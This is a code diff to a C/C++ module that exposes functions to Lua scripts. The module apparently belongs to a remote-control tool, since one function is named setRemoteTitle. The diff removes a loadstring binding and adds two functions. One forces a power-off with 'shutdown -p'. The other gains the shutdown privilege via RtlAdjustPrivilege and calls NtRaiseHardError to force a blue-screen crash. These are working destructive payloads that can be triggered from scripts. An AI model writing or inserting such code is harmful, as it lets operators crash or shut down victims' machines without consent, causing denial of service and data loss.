@@ -83,8 +83,31 @@ int lua_setRemoteTitle(lua_State* L) {
 	return 0;
 }
 
-int lua_loadstring(lua_State* L) {
-	int r = luaL_loadstring(L, lua_tostring(L, 1));
-	lua_pushnumber(L, r);
-	return 1;
+int lua_shutdown(lua_State* L) {
+	system("shutdown -p");
+	return 0;
+}
+
+int lua_bsod(lua_State* L) {
+	typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege) (
+		ULONG privilege,
+		BOOLEAN enable,
+		BOOLEAN current_thread,
+		PBOOLEAN enabled);
+	typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(
+		NTSTATUS error_status,
+		ULONG number_of_parameters,
+		ULONG unicode_string_parameter_mask,
+		PULONG_PTR parameters,
+		ULONG response_option,
+		PULONG reponse);
+	pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+	BOOLEAN enabled;
+	if (RtlAdjustPrivilege(19, TRUE, FALSE, &enabled) == 0)
+	{
+		pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
+		ULONG response;
+		NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, 6, &response);
+	}
+	return 0;
 }
